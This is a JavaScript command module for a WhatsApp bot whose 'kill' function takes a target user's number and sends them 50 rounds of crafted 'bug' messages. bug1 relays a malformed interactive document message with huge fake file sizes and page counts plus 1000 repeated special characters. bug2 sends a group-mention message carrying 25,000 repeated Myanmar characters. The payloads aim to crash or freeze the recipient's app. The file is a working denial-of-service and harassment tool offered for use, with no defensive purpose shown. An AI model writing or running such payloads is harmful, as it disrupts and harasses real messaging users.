import bugchat from '../bugs/bugchat.js';
import ineffable from '../bugs/ineffable.js';

async function kill(message, client) {

    try {
        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {
            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        // Normalize command input
        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1); // Extract arguments

        let participant;

        // Handle reply to message
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant; // Quoted user's JID
        } else if (args.length > 0) {
            participant = args[0].replace('@', '') + '@s.whatsapp.net'; // Argument user JID
        } else {
            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 50; i++) {

            await bug1(message, client, participant);

            await bug2(message, client, participant);

            await new Promise(resolve => setTimeout(resolve, 2000));

        }

    } catch (error) {
        console.error("An error occurred while trying to bug the target:", error);
        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}

async function bug1(message, client, participant) {
    try {
        const remoteJid = participant;

        await client.relayMessage(
            remoteJid,
            {
                ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Document",
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: `⿻Senku is ......\n${"ꦾ".repeat(1000)}\n\n`
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{}"
                            },
                            contextInfo: {
                                mentionedJid: ["6289526156543@s.whatsapp.net"],
                                forwardingScore: 1,
                                isForwarded: true,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                quotedMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "9999999999999",
                                        pageCount: 1316134911,
                                        mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                        fileName: "Sample Document",
                                        fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                        directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mediaKeyTimestamp: "1724474503",
                                        contactVcard: true,
                                        jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                    }
                                }
                            }
                        }
                    }
                }
            },
            {}
        );

    } catch (error) {
        console.error("Error in bug1:", error);
    }
}
async function bug2(message, client, participant) {
    try {
        // Ensure participant is valid
        if (!participant || !participant.includes('@s.whatsapp.net')) {
            console.error("Error: Invalid participant", participant);
            return;
        }

        console.log(`Sending bug2 message to: ${participant}`);

        const virtex = "Senku is ....." + "ြ".repeat(25000);

        const msgPayload = {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999",
                                pageCount: 0x9184e729fff,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "NtahMengapa..",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true
                            },
                            title: "",
                            hasMediaAttachment: true
                        },
                        body: {
                            text: virtex
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: ["0@s.whatsapp.net"],
                            groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Senku" }]
                        }
                    }
                }
            }
        };

        console.log("Sending relayMessage...");
        const response = await client.relayMessage(participant, msgPayload, {});

        console.log("relayMessage response:", response);

    } catch (error) {
        console.error("Error in bug2:", error);
    }
}


export default kill;